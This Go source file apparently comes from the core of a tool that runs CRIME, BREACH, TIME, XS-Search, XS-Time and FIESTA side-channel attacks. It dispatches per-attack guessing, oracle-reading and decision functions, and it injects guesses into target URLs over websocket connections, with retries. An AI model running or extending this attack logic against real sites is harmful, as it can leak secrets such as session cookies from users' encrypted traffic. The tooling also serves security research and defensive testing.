package core

import (
	"errors"
	"strings"
)

// oracleToInt function...
func (c *Core) oracleToInt(oracles []int) (int, error) {
	switch c.attack {
	case CRIME:
		return c.defaultOracleToInt(oracles)
	case BREACH:
		return c.defaultOracleToInt(oracles)
	case TIME:
		return c.defaultOracleToInt(oracles)
	case XSSEARCH:
		return c.defaultOracleToInt(oracles)
	case XSTIME:
		return c.defaultOracleToInt(oracles)
	case FIESTA:
		return c.fiestaOracleToInt(oracles)
	case DUMMY:
		return c.defaultOracleToInt(oracles)
	default:
		return 0, errors.New("oracleToInt not implemented for the given attack")
	}
}

func (c *Core) defaultOracleToInt(oracles []int) (int, error) {
	i := 0
	for _, o := range oracles {
		if o < c.minSize {
			continue
		}
		if i == c.connN {
			return o, nil
		}
		i++
	}
	return 0, errors.New("defaultOracleToInt could not found the right oracle")
}

// guess function...
func (c *Core) guess(g string) (int, error) {
	switch c.attack {
	case CRIME:
		return c.crimeGuess(g)
	case BREACH:
		return c.breachGuess(g)
	case TIME:
		return c.timeGuess(g)
	case XSSEARCH:
		return c.xssearchGuess(g)
	case XSTIME:
		return c.xstimeGuess(g)
	case FIESTA:
		return c.fiestaGuess(g)
	case DUMMY:
		return c.dummyGuess(g)
	default:
		return 0, errors.New("guess not implemented for the given attack")
	}
}

func (c *Core) guessSize(g string) (int, error) {
	retries := 0
	maxRetries := 3

	// Create url
	url := strings.Replace(c.option["URL"], wildcard, g, 1)

	// Retry up to 3 times
	for {
		// Send Guess
		if c.pipe.HowManyWS() == 0 {
			if retries < maxRetries {
				retries += 1
				continue
			}
			return 0, errors.New("No active connections")
		}

		// Clean proxy
		c.relay.Clean()

		// Send new guess
		c.pipe.WriteToConn(0, url)

		// Grab information
		info, e := c.getInfo()
		if e != nil {
			if retries < maxRetries {
				retries += 1
				continue
			}
			return 0, e
		}

		// Get Oracle
		var oracles []int
		for _, x := range info {
			oracle, e := c.getOracle(x)
			if e == nil {
				oracles = append(oracles, oracle)
			}
		}

		if len(oracles) == 0 {
			if retries < maxRetries {
				retries += 1
				continue
			}
		}

		// Get the oracle value
		oInt, err := c.oracleToInt(oracles)
		if err == nil {
			return oInt, nil
		}

		if retries < maxRetries {
			retries += 1
			continue
		}
		return 0, errors.New("No oracles found")
	}
}

// makeDecision function...
func (c *Core) makeDecision(right, wrong int, results map[string]int) ([]string, error) {
	switch c.attack {
	case CRIME:
		return c.crimeMakeDecision(right, wrong, results)
	case BREACH:
		return c.breachMakeDecision(right, wrong, results)
	case TIME:
		return c.timeMakeDecision(right, wrong, results)
	case XSSEARCH:
		return c.xssearchMakeDecision(right, wrong, results)
	case XSTIME:
		return c.xstimeMakeDecision(right, wrong, results)
	case FIESTA:
		return c.fiestaMakeDecision(right, wrong, results)
	case DUMMY:
		return c.dummyMakeDecision(right, wrong, results)
	default:
		return []string{}, errors.New("makeDecision not implemented for the given attack")
	}
}
